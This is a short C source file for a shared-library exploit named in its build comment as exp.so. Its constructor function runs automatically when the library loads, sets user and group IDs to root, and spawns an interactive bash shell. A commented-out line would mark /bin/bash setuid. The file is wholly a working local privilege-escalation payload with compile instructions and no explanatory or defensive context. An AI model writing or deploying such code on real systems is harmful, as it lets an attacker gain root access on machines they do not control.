#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void bad_stuff() {
        setuid(0);
        setgid(0);
        system("/bin/bash -i");
        // system("chmod +s /bin/bash");
} // gcc -shared -fPIC -o exp.so exp_linux.c